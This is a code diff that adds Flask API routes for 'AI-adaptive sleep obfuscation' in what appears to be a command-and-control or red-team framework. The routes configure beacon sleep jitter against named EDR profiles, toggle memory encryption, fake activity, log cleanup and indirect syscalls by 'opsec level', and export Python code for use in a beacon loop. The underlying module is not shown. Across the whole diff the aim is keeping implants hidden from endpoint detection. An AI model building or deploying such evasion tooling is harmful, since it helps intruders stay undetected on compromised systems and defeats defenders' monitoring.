@@ -471,3 +471,427 @@ def list_reports():
             for rid, r in _test_reports.items()
         ]
     })
+
+
+# ============================================================
+# AI-ADAPTIVE SLEEP OBFUSCATION ROUTES
+# ============================================================
+
+# Import sleep obfuscation module
+try:
+    from evasion.sleep_obfuscation import (
+        AIAdaptiveSleepObfuscator,
+        JitterPattern,
+        EDRProduct,
+        EDR_PROFILES,
+        create_ghost_mode_obfuscator,
+        create_interactive_obfuscator,
+        create_aggressive_obfuscator,
+    )
+    HAS_SLEEP_OBFUSCATION = True
+except ImportError:
+    HAS_SLEEP_OBFUSCATION = False
+    logger.warning("Sleep obfuscation module not available")
+
+
+# Store active sleep obfuscators for sessions
+_sleep_obfuscators = {}
+
+
+@evasion_bp.route('/sleep/')
+def sleep_obfuscation_page():
+    """AI-Adaptive Sleep Obfuscation configuration page"""
+    return render_template('sleep_obfuscation.html')
+
+
+@evasion_bp.route('/sleep/status', methods=['GET'])
+def sleep_status():
+    """Get sleep obfuscation module status and capabilities"""
+    return jsonify({
+        'success': True,
+        'available': HAS_SLEEP_OBFUSCATION,
+        'patterns': [p.value for p in JitterPattern] if HAS_SLEEP_OBFUSCATION else [],
+        'edr_profiles': [e.value for e in EDRProduct] if HAS_SLEEP_OBFUSCATION else [],
+        'active_sessions': len(_sleep_obfuscators),
+    })
+
+
+@evasion_bp.route('/sleep/configure', methods=['POST'])
+def configure_sleep():
+    """
+    Configure sleep obfuscation settings
+    
+    JSON body:
+    {
+        "session_id": "beacon_123",
+        "base_sleep_ms": 30000,
+        "jitter_percent": 50,
+        "pattern": "adaptive",
+        "opsec_level": 3,
+        "edr_override": null,
+        "auto_detect_edr": true
+    }
+    """
+    if not HAS_SLEEP_OBFUSCATION:
+        return jsonify({
+            'success': False,
+            'error': 'Sleep obfuscation module not available'
+        }), 503
+    
+    data = request.get_json()
+    session_id = data.get('session_id', f"session_{int(datetime.now().timestamp())}")
+    
+    try:
+        # Parse pattern
+        pattern_str = data.get('pattern', 'adaptive')
+        pattern = JitterPattern(pattern_str)
+        
+        # Create obfuscator
+        obfuscator = AIAdaptiveSleepObfuscator(
+            base_sleep_ms=data.get('base_sleep_ms', 30000),
+            jitter_percent=data.get('jitter_percent', 50),
+            pattern=pattern,
+            opsec_level=data.get('opsec_level', 3),
+            auto_detect_edr=data.get('auto_detect_edr', True)
+        )
+        
+        # Override EDR if specified
+        edr_override = data.get('edr_override')
+        if edr_override:
+            obfuscator.set_edr_override(EDRProduct(edr_override))
+        
+        # Store obfuscator
+        _sleep_obfuscators[session_id] = obfuscator
+        
+        return jsonify({
+            'success': True,
+            'session_id': session_id,
+            'config': {
+                'base_sleep_ms': obfuscator.base_sleep_ms,
+                'jitter_percent': obfuscator.jitter_percent,
+                'pattern': obfuscator.pattern.value,
+                'opsec_level': obfuscator.opsec_level,
+                'detected_edr': obfuscator._detected_edr.value,
+            }
+        })
+    except Exception as e:
+        logger.error(f"Failed to configure sleep obfuscation: {e}")
+        return jsonify({
+            'success': False,
+            'error': str(e)
+        }), 400
+
+
+@evasion_bp.route('/sleep/profiles', methods=['GET'])
+def get_sleep_profiles():
+    """Get available sleep profiles and EDR configurations"""
+    if not HAS_SLEEP_OBFUSCATION:
+        return jsonify({'success': False, 'error': 'Module not available'}), 503
+    
+    profiles = {
+        'ghost': {
+            'name': 'Ghost Mode',
+            'description': 'Maximum stealth for extended undetected operation (hours/days)',
+            'base_sleep_ms': 60000,
+            'jitter_percent': 70,
+            'pattern': 'hybrid',
+            'opsec_level': 4
+        },
+        'interactive': {
+            'name': 'Interactive',
+            'description': 'Low-latency for interactive sessions with evasion',
+            'base_sleep_ms': 5000,
+            'jitter_percent': 40,
+            'pattern': 'gaussian',
+            'opsec_level': 2
+        },
+        'aggressive': {
+            'name': 'Aggressive',
+            'description': 'Fast operations with minimal delay and basic evasion',
+            'base_sleep_ms': 1000,
+            'jitter_percent': 80,
+            'pattern': 'gaussian',
+            'opsec_level': 1
+        }
+    }
+    
+    edr_configs = {}
+    for product, profile in EDR_PROFILES.items():
+        edr_configs[product.value] = {
+            'name': product.value.title(),
+            'behavioral_ml': profile.behavioral_ml,
+            'memory_scanning': profile.memory_scanning,
+            'sleep_pattern_detection': profile.sleep_pattern_detection,
+            'syscall_hooking': profile.syscall_hooking,
+            'recommended_pattern': profile.recommended_pattern.value,
+            'min_sleep_ms': profile.min_sleep_ms,
+            'max_jitter_percent': profile.max_jitter_percent
+        }
+    
+    return jsonify({
+        'success': True,
+        'profiles': profiles,
+        'edr_configs': edr_configs,
+        'patterns': [
+            {
+                'value': p.value,
+                'name': p.value.replace('_', ' ').title(),
+                'description': {
+                    'gaussian': 'Natural variance, mimics network traffic',
+                    'fibonacci': 'Mathematical pattern, hard to fingerprint',
+                    'poisson': 'Event-based timing, realistic network behavior',
+                    'ml_entropy': 'GAN-like entropy, defeats ML detection',
+                    'adaptive': 'AI-selected based on EDR detection',
+                    'hybrid': 'Combines multiple patterns dynamically'
+                }.get(p.value, '')
+            }
+            for p in JitterPattern
+        ]
+    })
+
+
+@evasion_bp.route('/sleep/generate-jitter', methods=['POST'])
+def generate_jitter_sample():
+    """
+    Generate sample jitter values for visualization
+    
+    JSON body:
+    {
+        "session_id": "beacon_123",  // or use inline config
+        "count": 50,
+        "pattern": "hybrid",
+        "base_sleep_ms": 30000,
+        "jitter_percent": 50
+    }
+    """
+    if not HAS_SLEEP_OBFUSCATION:
+        return jsonify({'success': False, 'error': 'Module not available'}), 503
+    
+    data = request.get_json()
+    count = min(data.get('count', 50), 500)  # Max 500 samples
+    
+    # Get or create obfuscator
+    session_id = data.get('session_id')
+    if session_id and session_id in _sleep_obfuscators:
+        obfuscator = _sleep_obfuscators[session_id]
+    else:
+        # Create temporary obfuscator
+        pattern_str = data.get('pattern', 'hybrid')
+        try:
+            pattern = JitterPattern(pattern_str)
+        except ValueError:
+            pattern = JitterPattern.HYBRID
+        
+        obfuscator = AIAdaptiveSleepObfuscator(
+            base_sleep_ms=data.get('base_sleep_ms', 30000),
+            jitter_percent=data.get('jitter_percent', 50),
+            pattern=pattern,
+            auto_detect_edr=False,
+            opsec_level=1  # Low OPSEC for simulation
+        )
+    
+    # Generate samples
+    samples = []
+    for i in range(count):
+        jitter_ms = obfuscator.calculate_jitter()
+        samples.append({
+            'index': i,
+            'duration_ms': round(jitter_ms, 2),
+            'duration_sec': round(jitter_ms / 1000, 2)
+        })
+    
+    # Calculate statistics
+    durations = [s['duration_ms'] for s in samples]
+    avg = sum(durations) / len(durations)
+    min_d = min(durations)
+    max_d = max(durations)
+    variance = sum((d - avg) ** 2 for d in durations) / len(durations)
+    
+    return jsonify({
+        'success': True,
+        'samples': samples,
+        'statistics': {
+            'count': count,
+            'average_ms': round(avg, 2),
+            'min_ms': round(min_d, 2),
+            'max_ms': round(max_d, 2),
+            'variance': round(variance, 4),
+            'std_deviation': round(variance ** 0.5, 2),
+            'pattern': obfuscator.pattern.value
+        }
+    })
+
+
+@evasion_bp.route('/sleep/simulate', methods=['POST'])
+def simulate_sleep():
+    """
+    Simulate a sleep operation (for testing, doesn't actually sleep)
+    
+    JSON body:
+    {
+        "session_id": "beacon_123",
+        "duration_ms": null  // null = auto-calculate
+    }
+    """
+    if not HAS_SLEEP_OBFUSCATION:
+        return jsonify({'success': False, 'error': 'Module not available'}), 503
+    
+    data = request.get_json()
+    session_id = data.get('session_id')
+    
+    if not session_id or session_id not in _sleep_obfuscators:
+        return jsonify({
+            'success': False,
+            'error': 'Session not found. Configure sleep first.'
+        }), 404
+    
+    obfuscator = _sleep_obfuscators[session_id]
+    duration_ms = data.get('duration_ms')
+    
+    # Calculate what would happen
+    if duration_ms is None:
+        duration_ms = int(obfuscator.calculate_jitter())
+    
+    # Simulate chunk splitting
+    import random
+    chunk_count = random.randint(3, 7 + obfuscator.opsec_level)
+    
+    return jsonify({
+        'success': True,
+        'simulation': {
+            'calculated_duration_ms': duration_ms,
+            'chunk_count': chunk_count,
+            'syscall_method': 'NtDelayExecution (indirect)' if obfuscator.opsec_level >= 4 else 
+                             'WaitForSingleObject' if obfuscator.opsec_level >= 3 else
+                             'SleepEx (alertable)' if obfuscator.opsec_level >= 2 else
+                             'Sleep (standard)',
+            'memory_encryption': obfuscator.opsec_level >= 2,
+            'fake_activity': obfuscator.opsec_level >= 2,
+            'log_cleanup': obfuscator.opsec_level >= 4,
+            'detected_edr': obfuscator.detected_edr,
+            'pattern_used': obfuscator.pattern.value
+        }
+    })
+
+
+@evasion_bp.route('/sleep/statistics/<session_id>', methods=['GET'])
+def get_sleep_statistics(session_id: str):
+    """Get statistics for a sleep session"""
+    if not HAS_SLEEP_OBFUSCATION:
+        return jsonify({'success': False, 'error': 'Module not available'}), 503
+    
+    if session_id not in _sleep_obfuscators:
+        return jsonify({
+            'success': False,
+            'error': 'Session not found'
+        }), 404
+    
+    obfuscator = _sleep_obfuscators[session_id]
+    stats = obfuscator.get_statistics()
+    
+    return jsonify({
+        'success': True,
+        'session_id': session_id,
+        'statistics': stats
+    })
+
+
+@evasion_bp.route('/sleep/sessions', methods=['GET'])
+def list_sleep_sessions():
+    """List all active sleep sessions"""
+    if not HAS_SLEEP_OBFUSCATION:
+        return jsonify({'success': False, 'error': 'Module not available'}), 503
+    
+    sessions = []
+    for sid, obf in _sleep_obfuscators.items():
+        sessions.append({
+            'session_id': sid,
+            'base_sleep_ms': obf.base_sleep_ms,
+            'pattern': obf.pattern.value,
+            'opsec_level': obf.opsec_level,
+            'detected_edr': obf.detected_edr,
+            'total_sleeps': len(obf._sleep_history)
+        })
+    
+    return jsonify({
+        'success': True,
+        'sessions': sessions,
+        'count': len(sessions)
+    })
+
+
+@evasion_bp.route('/sleep/delete/<session_id>', methods=['DELETE'])
+def delete_sleep_session(session_id: str):
+    """Delete a sleep session"""
+    if session_id in _sleep_obfuscators:
+        obf = _sleep_obfuscators.pop(session_id)
+        obf.stop_noise_thread()
+        return jsonify({
+            'success': True,
+            'message': f'Session {session_id} deleted'
+        })
+    
+    return jsonify({
+        'success': False,
+        'error': 'Session not found'
+    }), 404
+
+
+@evasion_bp.route('/sleep/export-config/<session_id>', methods=['GET'])
+def export_sleep_config(session_id: str):
+    """Export sleep configuration for use in beacon"""
+    if not HAS_SLEEP_OBFUSCATION:
+        return jsonify({'success': False, 'error': 'Module not available'}), 503
+    
+    if session_id not in _sleep_obfuscators:
+        return jsonify({
+            'success': False,
+            'error': 'Session not found'
+        }), 404
+    
+    obf = _sleep_obfuscators[session_id]
+    
+    # Generate Python code for beacon integration
+    config_code = f'''# AI-Adaptive Sleep Obfuscation Configuration
+# Generated for session: {session_id}
+
+from evasion.sleep_obfuscation import (
+    AIAdaptiveSleepObfuscator,
+    JitterPattern,
+    EDRProduct
+)
+
+# Create obfuscator with exported settings
+obfuscator = AIAdaptiveSleepObfuscator(
+    base_sleep_ms={obf.base_sleep_ms},
+    jitter_percent={obf.jitter_percent},
+    pattern=JitterPattern.{obf.pattern.name},
+    opsec_level={obf.opsec_level},
+    auto_detect_edr=True
+)
+
+# Override EDR if detected: {obf.detected_edr}
+# obfuscator.set_edr_override(EDRProduct.{obf._detected_edr.name})
+
+# Usage in beacon loop:
+# while beacon_active:
+#     obfuscator.obfuscated_sleep()  # Auto-calculated duration
+#     beacon_callback()
+
+# Or with explicit duration:
+# obfuscator.sleep(30000)  # 30 second sleep with obfuscation
+'''
+    
+    return jsonify({
+        'success': True,
+        'session_id': session_id,
+        'config_code': config_code,
+        'config_json': {
+            'base_sleep_ms': obf.base_sleep_ms,
+            'jitter_percent': obf.jitter_percent,
+            'pattern': obf.pattern.value,
+            'opsec_level': obf.opsec_level,
+            'detected_edr': obf.detected_edr
+        }
+    })
+
